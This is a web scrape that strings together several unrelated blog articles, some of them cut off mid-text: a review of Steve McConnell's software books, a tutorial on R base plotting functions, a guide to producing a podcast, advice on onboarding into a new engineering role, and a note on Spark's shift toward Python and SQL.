<p>There is lots to critique about the book, of course, particularly in 2020. Writing at the start of the Agile revolution, McConnell does not have much to say about agile practices or methodology (two entries in the index, in fact, both pointing to single-paragraph descriptions of books; there is no discussion of agile in the main text). Sure, all of the parts are there—there is a distinct shift in the discussion of change management and risk between the first edition and the second, for example—McConnell acknowledges that the different activities in software construction occur in parallel, and that the earlier a change is handled, the cheaper it will be. But he never quite gets to the conclusion that software need not be “measure twice, cut once”; that unlike carpentry, software has a limitless supply of infinitely malleable wood.</p>
<p>In some of the places where McConnell uses multiple citations to make a claim about software engineering, other writers have found the citations based on questionable data or not generalisable to the way most software is written, particularly “classic” studies from the 1970s looking at programming batch systems. But we will save that story, because a future instalment of the Programmer’s Library will cover one of those books in detail. It is more interesting than it sounds!</p>
<p>There is also lots to recommend the book: in fact, in the 16 years since it was written, nothing else comes close. I still use and recommend practices described in <em>Code Complete</em>. I have internalised most of the ideas about code organisation and conception. When I see someone who reminds me of mid-aughts me, this is one of the books that springs to mind.</p>
<p>Other books have come and gone that try to do bits of what McConnell does here, with varying degrees of success. Robert Martin’s <em>Clean Code</em> on low-level design teaches similar ideas but with less intellectual rigour. The same goes for his <em>Clean Coder</em> on the practice of being a developer, though this is a more contested field with good showings from Pete McBreen (<em>Software Craftsmanship: The New Imperative</em>) and Hunt &amp; Thomas (<em>The Pragmatic Programmer</em>). But none of these come close to supplanting <em>CC2E</em> as a manual for turning a programmer into a software engineer, and the realities of the software publishing business in 2020 mean that no replacement is likely to show up soon.</p>
<p>If all Steve McConnell had done was write this one book, his would be a significant contribution to the field. Even among the MS press books on software requirements, object thinking (not OOP), secure software development, solutions architecture, and more, this is a stand-out work. But he was and remains a prolific author, so now we turn to the rest of his library.</p>
<p>We will start by going back from 2004 to 1996. After the first edition of <em>Code Complete</em>, McConnell wrote a book about improving the capability of software teams to successfully deliver working software, ways of so doing he had uncovered by doing it and by helping others to do it. This book was <em>Rapid Development</em>, as distinct from the then-popular fad of Rapid Application Development. <em>Rapid Development</em> was explicitly <em>not</em> “programming, motherfucker”: an exhortation to just get down to coding as quickly as possible. <em>Rapid Development</em> was the (then, and from what I have seen, now too) groundbreaking advice that you should maybe align your development practices with your customers’ expectations and needs, and that doing so will help you give them what they need faster. This book had many recommendations for developers and managers to adopt on their team, including early and continuous delivery of working software through iterative, evolutionary development; continuous collaboration between the software team and the customers throughout the project; frequent feedback on the status and risks and reprioritisation so that the biggest risks are always next to be addressed; and more.</p>
<p>If this all sounds like it actually <em>is</em> agile software development, expressed four years before the Snowbird ski trip, that is for multiple reasons. Firstly by the time the manifesto was written, there was already broad understanding (at least among the more experienced and expert practitioners of software delivery) that the ideas of iterative, incremental development were transformative to the capabilities of software teams, there just was not yet a common banner under which all of the people calling for this could march. Secondly it is because I have been selective in my presentation of what is in <em>Rapid Development</em>: one of the “case studies” features a team who fail because they integrate their work too early, before all of the modules are fully tested and debugged, and this causes schedule slippage. Nowadays we recognise integration as one of the risks that we <em>should</em> mitigate by early and continuous monitoring; thus continuous integration.</p>
<p>But mostly it is because agile software development has been hollowed out since its introduction at the beginning of the millennium. Ask many development teams what they understand by Agile in 2020 and you will get a list similar to the highlights of <em>Rapid Development</em> I gave above: incremental and iterative delivery, customer involvement on the team, frequent retrospectives and feedback. That is not the entirety of the story, that is the <a href="https://www.adventureswithagile.com/2014/08/19/declaration-of-interdependence/">Project Managers’ Declaration of Interdependence</a> (originally published on Alistair Cockburn’s site in 2005). Agile software development also included a number of <em>technical</em> practices, not explicitly called out in the manifesto, on the basis that what we do changes more frequently than why we do it.</p>
<p>We have already mentioned Continuous Integration, and developers might readily mention Test-Driven Development (and maybe its more agile siblings, Behaviour-Driven Development and Acceptance Test-Driven Development, which remind us that software is done not when the tests pass, but when the software does what the customer wants from it). Some may begrudgingly allow daily stand-up meetings as an agile practice, though they may grumble. But how about user stories? Those are a technical practice, and an example of specification-by-customer-conversation. Domain-Driven Design encourages a shared vocabulary between the software team and the customers, enabling those conversations. A <a href="https://dl.acm.org/doi/10.1145/1985782.1985784">review of agile practices in scientific software development</a> lists 35 practices explicitly mentioned in the Scrum and XP methodologies. Of those, I informally count 22 technical (or at least not purely project-management) practices, and I would also suggest that those technical practices are the ones most patchily adopted across the industry, based on my own experience in many teams that describe their work as “Agile”.</p>
<p><em>Rapid Development</em> gets a bye on some of those practices on the basis that they had not been invented in 1996, but also because McConnell makes a much more general and much more useful argument: technical practices <em>are not guaranteed</em> to improve your ability to deliver working software to your customers. Indeed adopting new practices on a new project is likely to <em>reduce</em> your control over and understanding of the project, thus <em>harming</em> your ability to communicate effectively with customers what you are capable of, how much it will cost, and how long it will take. This incredibly simple and important notion has been rediscovered many times in the industry, and is currently usually cited in the form of “innovation tokens” from Dan McKinley’s <a href="https://mcfunley.com/choose-boring-technology">choose boring technology</a>.</p>
<p><em>CC2E</em> gets a bye on its short shrift on Agile for the innovation tokens reason: before the agile-industrial complex took over and made agile all about hiring scrum masters and producing burn-down charts, it was a shorthand for a lot of project management <em>and</em> technical practices and there was not …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">




<p>Base plotting is as old as R itself yet for most users it remains mysterious.
They might be using <code>plot()</code> or even know the full list of its parameters but most never understand it fully.
This article attempts to demystify base graphics by providing a friendly introduction for the uninitiated.</p>

<h2 id="deconstructingaplot">Deconstructing a plot</h2>

<p>Quickly after learning R users start producing various figures by calling <code>plot()</code>, <code>hist()</code>, or <code>barplot()</code>.
Then, when faced with a complicated figure, they start stacking those plots on top of one another using various hacks, like <code>add=TRUE</code>, <code>ann=FALSE</code>, <code>cex=0</code>.
For most this marks the end of their base plotting journey and they leave with an impression of it being an ad-hoc bag of tricks that has to be learned and remembered but that otherwise is hard, inconsistent, and unintuitive.
Nowadays even experts who write about base graphics<a href="#cn:1" id="cnref:1" title="see citation"><sup>(1)</sup></a> or compare it with other systems<a href="#cn:2" id="cnref:2" title="see citation"><sup>(2)</sup></a> share the same opinion.
However, those initial functions everyone was using are only wrappers on top of the smaller functions that do all the work.
And many would be surprised to learn that under the hood base plotting follows the paradigm of having a set of small functions that each do one thing and work well with one another.</p>

<p>Let’s start with the simplest example.</p>

<pre><code>plot(0:10, 0:10, xlab = "x-axis", ylab = "y-axis", main = "my plot")
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/plot.svg" alt="">
</figure>

<p>The <code>plot()</code> function above is really just a wrapper that calls an array of lower level functions.</p>

<pre><code>plot.new()
plot.window(xlim = c(0,10), ylim = c(0,10))
points(0:10, 0:10)
axis(1)
axis(2)
box()
title(xlab = "x-axis")
title(ylab = "y-axis")
title(main = "my plot")
</code></pre>

<p>Written like this all the elements comprising the plot become clear.
Every new function call draws a single object on top of the plot produced up until that point.
It becomes easy to see which line should be modified in order to change something on the plot.
Just as an example let’s modify the above plot by: 1) adding a grid, 2) removing the box around the plot, 3) removing the axis lines, 4) making axis labels bold, 5) turning the annotation labels red, and 6) shifting the title to the left.</p>

<pre><code>plot.new()
plot.window(xlim = c(0,10), ylim = c(0,10))
grid()
points(0:10, 0:10)
axis(1, lwd = 0, font.axis=2)
axis(2, lwd = 0, font.axis=2)
title(xlab = "x-axis", col.lab = "red3")
title(ylab = "y-axis", col.lab = "red3")
title(main = "my plot", col.main = "red3", adj = 0)
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/plot2.svg" alt="">
</figure>

<p>In each case to achieve the wanted effect only a single line had to be modified.
And the function names are very intuitive.
A person without any R experience would have no trouble saying which element on the plot is added by which line or changing some of the parameters.</p>

<p>So, in order to construct a plot various functions are called one by one.
But where do we get all the names for those functions?
Do we need to remember hundreds of them?
Turns out the set of all the things you might need to do on a plot is pretty limited.</p>

<pre><code>par()          # specifies various plot parameters
plot.new()     # starts a new plot
plot.window()  # adds a coordinate system to the plot region

points()       # draws points
lines()        # draws lines connecting 2 points
abline()       # draws infinite lines throughout the plot
arrows()       # draws arrows
segments()     # draws segmented lines
rect()         # draws rectangles
polygon()      # draws complex polygons

text()         # adds written text within the plot
mtext()        # adds text in the margins of a plot

title()        # adds plot and axis annotations
axis()         # adds axes
box()          # draws a box around a plot
grid()         # adds a grid over a coordinate system
legend()       # adds a legend
</code></pre>

<p>The above list covers majority of the functionality needed to recreate almost any plot.
And for demonstration <code>example()</code> can be used to quickly see what each of those functions do, i.e. <code>example(rect)</code>.
R also has some other helpful functions like <code>rug()</code> and <code>jitter()</code> to make certain situations easier but they are not crucial and can be implemented using the ones listed above.</p>

<p>Function names are quite straightforward but what about their arguments?
Indeed some of argument names, like <code>cex</code> can seem quite cryptic.
But the argument name is always an abbreviation for a property of the plot<a href="#cn:3" id="cnref:3" title="see citation"><sup>(3)</sup></a>.
For example <code>col</code> is a shorthand for “color”, <code>lwd</code> stands for “line-width”, and <code>cex</code> means “character expansion”.
Good news is that in general the same arguments stand for the same properties across all of base R functions.
And for a specific function <code>help()</code> can always be used in order to get the list of all arguments and their descriptions.</p>

<p>To further illustrate the consistency between arguments let’s return to the first example.
By now it should be pretty clear, with one exception - the <code>axis(1)</code> and <code>axis(2)</code> lines.
Where do those numbers: <code>1</code> and <code>2</code> came from?
The numbers specify the positions around the plot and they start from <code>1</code> which refers to the bottom of the plot and go clockwise up to <code>4</code> which refers to the right side.
The picture below demonstrates the relationship between numbers and four sides of the plot.</p>

<pre><code>plot.new()
box()
mtext("1", side = 1, col = "red3")
mtext("2", side = 2, col = "red3")
mtext("3", side = 3, col = "red3")
mtext("4", side = 4, col = "red3")
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/positions.svg" alt="">
</figure>

<p>The same position numbers are used throughout the various different functions.
Whenever a parameter of some function needs to specify a side, chances are it will do so using the numeric notation described above.
Below are a few examples.</p>

<pre><code>par(mar = c(0,0,4,4))        # margins of a plot: c(bottom, left, right , top)
par(oma = c(1,1,1,1))        # outer margins of a plot
axis(3)                      # side where axis will be displayed
text(x, y, "text", pos = 3)  # pos selects the side the "text" is displayed at
mtext("text", side = 4)      # side specifies the margin "text" will appear in
</code></pre>

<p>Another important point is vectorization.
Almost all the arguments for base plotting functions are vectorized.
For example, when plotting rectangles the user does not have to add each point of each rectangle one by one within a loop.
Instead he or she can draw all the related objects with one function call while at the same time specifying different positions and parameters for each.</p>

<pre><code>plot.new()
plot.window(xlim = c(0,3), ylim = c(0,3))

rect(xleft = c(0,1,2), ybottom = c(0,1,2), xright = c(1,2,3), ytop = c(1,2,3),
     border = c("pink","red","darkred"), lwd = 10
     )
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/rect.svg" alt="">
</figure>

<p>Here is another example producing a check board pattern.</p>

<pre><code>plot.new()
plot.window(xlim = c(0,10), ylim = c(0,10))

xs &lt;- rep(1:9, each = 9)
ys &lt;- rep(1:9)

rect(xs-0.5, ys-0.5, xs+0.5, ys+0.5, col = c("white","darkgrey"))
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/checkboard.svg" alt="">
</figure>

<h2 id="constructingaplot">Constructing a plot</h2>

<p>One of base R graphics strengths is it’s flexibility and potential for customization.
It really shines when the user needs to follow a particular style found in an existing example or a template<a href="#cn:4" id="cnref:4" title="see citation"><sup>(4)</sup></a>.
Below are a few illustrations demonstrating how different base functions can work together and reconstruct various types of common figures from scratch.</p>

<ul>
<li><p>Annotated barplot of USA population growth over time.</p>

<pre><code>x &lt;- time(uspop)
y &lt;- uspop

plot.new()
plot.window(xlim = range(x), ylim = range(pretty(y)))

rect(x-4, 0, x+4, y)
text(x, y, y, pos = 3, col = "red3", cex = 0.7)

mtext(x, 1, at = x, las = 2, cex = 0.7, font = 2)
axis(2, lwd = 0, las = 2, cex.axis = 0.7, font.axis = 2)
title("US population growth", adj = 0, col.main = "red2")
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/barplot.svg" alt="">
</figure>

<p>In this case for each rectangle four sets of points had to be specified: x and y for the left bottom corner plus x and y for the top right corner.
In the end, even so this is a more complicated example, we still added all the different pieces of information using single function calls to <code>rect()</code>, <code>text()</code>, and <code>mtext()</code>.</p></li>
<li><p>Parallel coordinates plot using the “iris” dataset.</p>

<pre><code>palette(c("cornflowerblue", "red3", "orange"))

plot.new()
plot.window(xlim = c(1,4), ylim = range(iris[,-5]))
grid(nx = NA, ny = NULL)
abline(v = 1:4, col = "grey", lwd = 5, lty = "dotted")

matlines(t(iris[,-5]), col = iris$Species, lty = 1)

axis(2, lwd = 0, las = 2)
mtext(variable.names(iris)[-5], 3, at = 1:4, line = 1, col = "darkgrey")

legend(x = 1, y = 2, legend = unique(iris$Species), col = unique(iris$Species),
       lwd = 3, bty = 'n')
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/parallel.svg" alt="">
</figure>

<p>In this example we used a special function <code>matlines()</code> that draws one line for each column in a matrix.
We also did a few other things that were novel so far: changed the default numeric colors via <code>palette()</code>, and used factor levels for specifying the actual colors within <code>matlines()</code> and <code>legend()</code>.
Changing palette allows us to customize the color scheme while passing factors for the color arguments guarantees that the same colors are consistently assigned to the same factor levels across all the different functions.</p></li>
<li><p>Dot plot of death rates in Virginia in 1940.</p>

<pre><code>colors &lt;- hcl.colors(5, "Zissou")
ys     &lt;- c(1.25, 2, 1.5, 2.25)

plot.new()
plot.window(xlim = range(0,VADeaths), ylim = c(1,2.75))

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Podcasting is hands down… the most impactful way to build a relationship with your audience…‍</p><p><em>I mean, who else talks to them softly in their ear each morning?<br></em></p><p>Someone much more intimate with them than you, I would assume!<br></p><p>But, the real question is how to produce a podcast that is good enough to get your listener to listen to you each day, week or month?<br></p><p>The first time you listened to a really engaging show may have led you to think:&nbsp;<br></p><blockquote><strong><em>“That sounds easy and fun. I should start one…”</em><br></strong></blockquote><p>As effortless and fun it is to listen to a podcast, this doesn't also ring true for the production of side of the equation.<br></p><p>Today, we are going to walk you through the “behind the scenes” process of producing an awesome podcast that will have your listener refreshing their Google Podcasts app each morning in anticipation of your new episode.&nbsp;&nbsp;<br></p><p>By the end, you will be able to answer how to produce a podcast… and more importantly be one step closer to being able to produce your own podcast.<br></p><p><em>Let’s get started!&nbsp;</em></p><h2>Step 1 - Planning</h2><p>Before you even ask yourself how to produce a podcast, you need to plan.</p><p>Hoping for podcast success without a planned roadmap is just a dream. Your podcast roadmap is the first thing you will do before recording your podcast.&nbsp;</p><p>Who, why, where, and when are some questions that MUST be asked as the idea of starting a podcasting strikes your mind. <br></p><h3>Who is your podcast audience?</h3><p>In our opinion, the number one reason why podcast fail is because the creators don't think enough about whom they plan to add value too. Without this step... a watered down, useless podcast is produced and the creators give up after three months as they don't up generating the audience they thought they would.<br></p><p>If you don’t know who you are going to address, it is almost like trying to find Planet Earth in the Milky Way galaxy...</p><figure id="w-node-eebaa21cf0bc-86dd1663"><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fbd3f47921868483fddd15e_Y5KIrS6TN5P4qjIcOYNclGE3emYsPzGUGj278uDDE169-G973GyhRWPE-GIN_TvWWTIYp6Qxrb0K5k73p_ULFQn73DecQ3rSVAwPrwcgf0JgCB-dL4VIrn5TKR489NOrNcw61NQ.gif" alt=""></p></figure><p>For instance, a podcast about horror film would be valued by the people who have a passion for horror films. A podcast about <a target="_blank" href="https://podcasts.bcast.fm/confessions-of-a-b2b-marketer">B2B marketing</a> will add value to B2B marketers looking to up their game.<br></p><p><em>What do you know about and who can you add value too?</em><br></p><p>This is the question that you MUST ask.<br></p><p>Be sure to look at possible podcast competitors… if there are already many podcasts in your niche this suggests that there is demand for a show like yours… but it may be hard to get subscribers.<br></p><p>If there are no podcasts in your chosen subject area then there may be low demand, but low competition means it should be easier to generate an audience! <br></p><h3>What should my podcast be about?</h3><p>This is closely linked to the last section...<br></p><p>One basic premise of content marketing is to feed potential customers with the information they need BEFORE they need to buy your product or service. If you are the person or business providing this information you move your customers towards buying AND allow them to build trust in you.<br></p><p>This will mean that when they come to buy... they buy from you.<br></p><p>Now of course, you need to be able to add value on this topic or have a network of people that can add value on this topic.<br></p><p>This is the sweet spot: the ability to add value with the information and the ability to monetise the information.<br></p><h3>What should I call my podcast?</h3><p>A podcast about fitness training with the name "The Sarah Clay Show" will leave you in despair, as many people will not click as they care about fitness training, not you Sarah ;)</p><figure><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fbd3f48f7fb0b0b7ccec927_C3B45_7_X_KgW7acbxX6ENXn_Eq80fDN351YmmAc4_MXfSPaihp8h8zm-wqTBFXPRGOSNtRVWbE2ytrsW2EyS2NpQQ_v3qamJwp9WQVoQ0_0gVQSLaDpBQ6Il6fNz5FVf798nkY.gif" alt=""></p></figure><p>Naming your podcast in this way is helpful when you already have a fanbase or audience through other mediums. <br></p><p>Instead, your podcast name will be both "descriptive and memorable".<br></p><p>Your target audience will reach you if your podcast name is organic and contains words related to your podcast subject. Your podcast should appear in search results for queries around your niche.<br></p><p>And when we say memorable, it means a person who looked for ‘fitness training podcast’ and clicked on your podcast, will only come back to listen to the same podcast if your podcast name is memorable.<br></p><p>So, the recipe for podcast name is: "descriptive and memorable".<br></p><p>As an example...<br></p><p>We run a podcast for a client called <a href="https://www.fame.so/case-study/leading-mobile-growth-with-storemaven" target="_blank">Mobile Growth &amp; Pancakes:</a><br></p><ul role="list"><li>Descriptive - Mobile Growth!</li><li>Memorable - Pancakes!<br></li></ul><h3>How long should each episode be?</h3><p>How long is a piece of string? ;)</p><p>When deciding how long a podcast episode should be... many top podcast producers refer to a person's average commute: 20 to 30 minutes. But in reality, your podcast episode length depends only on your audience, and your subject.&nbsp;<br></p><p>If your content is easily summarised in a short podcast of 15 minutes, that is the best episode length for you.&nbsp;<br></p><p>If your content needs over an hour of time to be presented, then it is the ideal length.&nbsp;</p><p>The second factor is your audience. One audience may absorb small chunks of 5 to 10 minutes whilst another audience may be happy to listen to a 2-hour-long interview.&nbsp;<br></p><p>While deciding how long your podcast episode should be... the answer really leads to another question: how long can you add value for?</p><p>That is the length of your episodes and not a second longer.<br></p><h3>Show Format</h3><p>Your show format might be the personal choice of the podcast producer, or it might be based on the requirements of a target audience. A podcast format sets a standard for what your audience should expect from your show.&nbsp;</p><p>There are really just a few show formats:</p><ul role="list"><li>Interview based - each episode features a guest</li><li>Monologue based - just you talking!</li><li>Short tips - small, actionable tips</li><li>Story based - telling a story within an episode or a season</li></ul><p>You need to choose the format that best suits you as a podcast host and your audience.</p><p>This is also a good opportunity for differentiation... if all the shows in your niche are interview based, you could gain traction fast with a more actionable tips based podcast.<br></p><h2>Step 2 - Pre-Production</h2><p>After answering the basic questions of the podcasting roadmap, now it’s time to set up your podcasting playground. Equipment, environment, and guests... We cannot cover how to produce a podcast without talking about pre-production.&nbsp;</p><h3>Essential Equipment</h3><p>The sound quality of your podcast highly depends on your choice of equipment. As a start, a USB mic, a laptop, and an internet connection are good to take off. But, over time you will need to progress to more complex equipment to achieve greater quality audio.<br></p><p>Before you make an investment in recording equipment, it is good to take a test drive with basic equipment. Once you are confident that your content is engaging the audience and you are enjoying this experience, then you should improvise to upgrade your podcast setup with more professional equipment.&nbsp;<br></p><p>This is what you will need to start with:<br></p><ul role="list"><li>A laptop</li><li>A microphone for voice recording</li><li>Audio Interface- It allows you to playback your voice recordings by cancelling all the background noise&nbsp;</li><li>A pair of headphones</li></ul><p>And more advanced equipment:</p><ul role="list"><li>A pop filter to eliminate the air blast when you say words with the sound of “t”, “p”, “b”</li><li>A mixer- more of post-production equipment, but it helps you to control music and sound levels&nbsp;</li><li>Mic stand- secondary, but it gives you more flexibility and eases to record your podcast&nbsp;</li></ul><h3>Recording Environment&nbsp;</h3><p>While you are recording your podcast sitting at your local café, no matter how good your content is... the surrounding noise and chatter will destroy the audio experience of your listeners. Similarly, recording your podcast with a table and chair in an empty room of 330 sq. feet will do nothing except generate an unpleasant echo.&nbsp;<br></p><p>A nice balance is important when your surrounding environment is concerned. A moderately furnished room with a quiet environment will enhance your podcast’s quality. We don’t mean that you need a soundproof room, but a calm space with minimal background noises.</p><h3>Scheduling Guests&nbsp;</h3><p>One important to-do in setting up the stage is scheduling your guests if your podcast format requires so. Unplanned and clueless podcasting might be more hectic as well as you might end up with a clumsy and unorganised podcast where you don’t know what you have to talk about to your guest.&nbsp;<br></p><p>In your podcast preparations, you should schedule your guests so that you have enough time to research about them, their work, or particular topics you would be discussing.&nbsp;<br></p><p>For booking your guests, you can go with communicating with them over email and get the time when they are easily available. We typically recommend booking guests in using scheduling software such as Calendly...<br></p><h2>Step 3 - Production</h2><p>The playing field for your podcast is set up...When you are recording your podcasts, you must be equipped with all the necessary ammunition. Now, it is time to get to the crux of the question of<strong> how to produce a podcast</strong>. </p><p>Here are a few things you should really take note of before you place yourself in the hot seat that is being a podcast host.&nbsp;</p><h3>Scripting Every Episode</h3><p>Scripting your whole podcast episode and sticking to it rigidly will fade the natural touch of your podcast. It may sound like a puppet show.&nbsp;<br></p><p>But, a completely unprepared podcast could also turn out to be a complete shambles.<br></p><p><em>Then... how to produce a podcast that has a good balance of natural touch and organisation?</em></p><p>You should make an outline of important topics or things you have planned to discuss in an episode. This tip is extremely important when you are doing a solo podcast. Because there is a lot more chance of getting lost and go off-road in this case.<br></p><p>However, if you have a podcast format where guests are invited, key points or questions you are going to ask your guests in a written form can help you to stay on track. But, have a flexible approach because your guest might go around to share an interesting experience. Make sure to go along with your guest instead of being too stiff and sticking to the outline.&nbsp;</p><h3>Share Questions with Guests</h3><p>You should send notes or an outline to your scheduled guest for every episode. It will help your guest to know what to expect, get prepared to answer the questions. Instead of sending scripted questions, we like to send rough discussion points...</p><p>This will help the guest prepare but not script answers... this is crucially important to cultivating …</p></div></div></div>

        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><img src="https://dmellonielet.com/images/onboarding.jpg" alt="WFH!" title="Photo by XPS on Unsplash"></p>

<p>Career moves like starting a new role are challenging, can often be unnerving, and for sure requires leveling up. <img title=":computer:" alt=":computer:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f4bb.png" height="20" width="20"></p>

<p>A few months back, I accepted an offer with another business group at Intel. To me, it was a great way of exploring new opportunities within the company and experiencing another flavor of its engineering culture. This new role was a scale-up from my previous one, a lot of new areas for me to contribute, learn, and explore.</p>

<p>What helped me tackle this was defining how I onboarded in the new role. In this article, I am sharing the framework and ideas from my onboarding learnings.</p>

<h2 id="onboarding-done-right">Onboarding done right</h2>

<p>A well-defined onboarding is crucial to provide team members with the resources they need to succeed and ensure their expectations match the reality of the organization. It also clears any confusion about the role. Not having the right onboarding experience can often lead to not clearly understanding the new work environment leading to one as the wrong fit for the team.</p>

<p>Usually, onboarding has two distinct &amp; complementary components:</p>

<ul>
  <li>
    <p><strong>General Onboarding</strong>: Getting familiar with the company culture, vision, mission, value, etc.</p>
  </li>
  <li>
    <p><strong>Role-specific Onboarding</strong>: Acquire the knowledge, skills, and behaviors to master the role effectively and efficiently.</p>
  </li>
</ul>

<p>Joining a new team brings in a plethora of information and emotions and can be quite stressful. If you are reading this as someone who needs to onboard a team member, I highly encourage taking some time to think through the prep work covering basics for onboarding. At the end of the article, I have listed some useful resources for the same.</p>

<p>The focus of this article is someone (particularly a software engineer) who will be onboarding a new role.</p>

<h2 id="the-onboarding-template-page_with_curl">The onboarding template <img title=":page_with_curl:" alt=":page_with_curl:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f4c3.png" height="20" width="20">
</h2>

<h4 id="1-set-expectations-with-yourself">1. Set expectations with yourself</h4>

<blockquote>
  <p>No one can hit their target with their eyes closed.” ― Paulo Coelho <img title=":sparkles:" alt=":sparkles:" src="https://github.githubassets.com/images/icons/emoji/unicode/2728.png" height="20" width="20"></p>
</blockquote>

<p>The most important thing is setting expectations for your new role. Sure, you have done quite some assessment before accepting the offer. However, this step talks about goal setting before your first day.</p>

<h3 id="2-set-clear-expectations-with-your-manager">2. Set clear expectations with your manager</h3>

<p>Well, you have cracked the role owing to your strengths and the value you potentially bring to the team. Hence, it is vital to discuss the expectations of onboarding with your manager. A few questions to ask:</p>

<ul>
  <li>What do you suggest I focus on for my first week and month in this team?</li>
  <li>How can I learn more about the project(s)?</li>
  <li>Is there a team ‘how-to’ document I can refer to?</li>
  <li>Who is my dedicated buddy for onboarding?</li>
  <li>What accesses a new member needs to request?</li>
</ul>

<h3 id="3-create-a-plan">3. Create a plan</h3>

<p>Now that you have a fair idea of the expectations, chart out an onboarding plan. It helps to list out activities to not be overwhelmed and create a to-do list to cover all essential tasks.</p>

<h3 id="4-meet-with-as-many-team-members-as-to-familiarize">4. Meet with as many team members as to familiarize</h3>

<p>In the pre-covid world, face to face introductions were much easier. It’s not quite the same in a remote environment.
Make it a point to proactively reach out to as many team members/ stakeholders and set introductory 1:1s to learn about them, get a preliminary idea of the project, learn more about their preferred working times/ style, etc. This is an opportunity to get started on the technical details about the systems, projects, etc., and also provides a window into other team members’ interests.</p>

<h3 id="5-work-with-your-buddy-on-the-team">5. Work with your buddy on the team</h3>

<p>“There is no such thing as a stupid question!”</p>

<p>It can be a bit daunting to ping someone with a question that feels stupid to ask even if it is not. A dedicated buddy on the new team makes it easier to figure out the correct point of contact for your questions. A buddy can help understand communication dynamics within and across the teams, help understand the company/ team abbreviations &amp; acronyms, guide you on your tasks, etc.</p>

<h3 id="6-ask-questions-a-lot-of-them">6. Ask questions.. A lot of them</h3>

<p>Your imposter syndrome sure will not kick in until the first week or two. Maybe it won’t kick in at all. But if you are venturing out for something new, more often it does. A great tip for dealing with this is to be fearless and ask questions (<em>again..there are no stupid questions..</em>). The more you can familiarize yourself with the new team, the project, and the business, the better. It may not all make sense to you all at once but keep notes. Eventually, it will all come together.</p>

<p>It also helps to schedule regular 1:1s with members of your team and driving the agenda on things you wish to understand in the project.
Another great way to learn fast is to shadow experienced team members on tasks, understand their thought process, watch them debug issues, understand their communication style.</p>

<h3 id="7-read-the-documentation-and-code">7. Read the documentation and code</h3>

<p>The best way to learn is to read the documentation and code. The information you have heard from your teammates will now start making more sense. Additionally, this will help you recognize potential improvements in the documentation/ codebase for future contributions.</p>

<h3 id="8-contribute">8. Contribute</h3>

<p>The best way to learn is to do. Nothing beats the feeling of your first commit in the new project- be it a bug fix, a small feature enhancement, documentation improvements, etc. Channel your doer mindset and look for ways to make things better.</p>

<h3 id="9-seek-feedback">9. Seek feedback</h3>

<p>In a loop of continuous improvement, nothing triumphs feedback. Seek constructive feedback from your manager, your teammates on what you did better and what are your blind spots. Where can you improve as well as discuss what challenges you are facing and how can you address them?</p>

<p>Good feedback is a two-way conversation. Not only should you receive feedback but also provide it. Be open to sharing what you learned through the onboarding process, what can potentially improve for the future, how did your team members help you feel comfortable with the process, etc.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Owning your onboarding can contribute to your success in the role and can bring joy. <img title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"> <img title=":chart_with_upwards_trend:" alt=":chart_with_upwards_trend:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f4c8.png" height="20" width="20"> I hope these tips and ideas can help new engineers navigate the onboarding successfully.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<p>I watched (COVID19-era version of “attended”)  the<a href="https://databricks.com/sparkaisummit"> latest spark Summit</a> and in one of the keynotes Reynold Xin from  Databricks, presented the following two images comparing spark usage on their platform on 2013 vs. 2020:</p>



<figure><img loading="lazy" src="https://arnon.me/wp-content/uploads/image-3-983x1024.png" alt="" width="645" height="671"></figure>



<figure><img loading="lazy" width="1024" height="947" src="https://arnon.me/wp-content/uploads/image-4-1024x947.png" alt=""></figure>



<p>While Databricks’ platform is, of course, not the whole spark community, I would wager that they have enough users to represent the overall trend.</p>



<p>Incidentally, the same trends are also happening outside of the Spark world with SQL re-installing itself as the standard to access data, on traditional RDBMSs, so called “NoSQL” databases (that are getting SQL  dialects) and NewSQL offerings. As for Python it is definitely  the go-to language for machine-learning (we’ll see if <a href="https://julialang.org/">Julia</a> will be able to dethrone it) </p>



<p>Anyway, back to spark, considering these numbers it comes as no surprise that a lot of the efforts that are coming from Databricks are diverging away from Scala and making much more investment in Python: </p>



<ul><li><a href="https://koalas.readthedocs.io/en/latest/" target="_blank" rel="noreferrer noopener">Koalas</a> – which is an attempt similar to <a href="https://dask.org/" target="_blank" rel="noreferrer noopener">Dask</a> i.e. trying to replicate pandas API on a distributed engine. </li><li><a href="https://databricks.com/blog/2020/09/04/an-update-on-project-zen-improving-apache-spark-for-python-users.html">Project Zen</a> – improving the PySpark developer experience </li></ul>



<p>I have to say, that in my opinion,  these two initiatives are crucial for Spark to remain relevant for python development. I have an anecdotal example from  a couple of years ago. I worked in a company where we developed predictive models that provide early alerting for medical deteriorations in ICU patients (the respiratory failure  model was <a rel="noreferrer noopener" href="https://www.fdanews.com/articles/197491-fda-clears-clew-medicals-screening-software-for-covid-19-patients" target="_blank">FDA approved during COVID-19</a>). Since I had a lot of good experience with Spark (on JVM) we started out with PySpark and integrated it with our pandas based feature building (both medical oriented and data science oriented) that look at patient hospitalization time-series data. We got all that to work with Spark but, the cryptic error message and the problematic memory tuning, with two runt-times JVM and python passing data back and forth, drove us to replace this with a new solution we built using Dask. That solution  was both easier to work with and used less resources.</p>



